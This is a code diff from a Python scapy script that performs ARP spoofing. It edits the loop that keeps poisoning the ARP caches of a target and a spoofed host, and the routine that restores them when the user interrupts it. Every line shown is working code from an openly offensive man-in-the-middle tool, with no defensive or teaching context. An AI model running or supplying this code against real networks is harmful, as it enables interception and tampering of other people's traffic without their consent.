@@ -32,7 +32,6 @@ def get_arguments():
 
 
 def restore_spoof(target_ip, spoof_ip, interface):
-    target_mac = get_mac(target_ip, interface)
     spoof_mac = get_mac(spoof_ip,interface)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
     scapy.send(packet, count=4, verbose=False, iface=interface)
@@ -84,11 +83,13 @@ else:
             spoof(options.target, options.spoof, options.interface)
             spoof(options.spoof, options.target, options.interface)
             sent_packet_count = sent_packet_count + 2
-            print("\rTelling " + options.target + " i am " + options.spoof + " [+] Packets sent: " + str(sent_packet_count)),
+            print("\rTelling " + options.target + " i am " + options.spoof + " [+] Packets sent: " + str(
+                sent_packet_count)),
             sys.stdout.flush()
             time.sleep(2)
     except KeyboardInterrupt:
         print("\n[+] Detected CTRL +C ..... Restting the ARP table.. Please wait.\n")
+        target_mac = get_mac(options.target, options.interface)
         restore_spoof(options.target, options.spoof, options.interface)
         restore_spoof(options.spoof, options.target, options.interface)
         print("ARP Table is now back to normal")
